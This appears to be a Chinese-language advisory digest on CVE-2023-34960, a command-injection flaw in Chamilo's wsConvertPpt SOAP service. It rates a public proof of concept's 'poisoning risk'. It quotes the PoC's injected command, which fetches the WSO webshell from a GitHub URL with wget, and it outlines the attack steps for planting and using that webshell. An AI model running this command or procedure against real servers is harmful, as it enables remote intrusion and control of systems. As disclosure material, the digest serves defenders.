## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)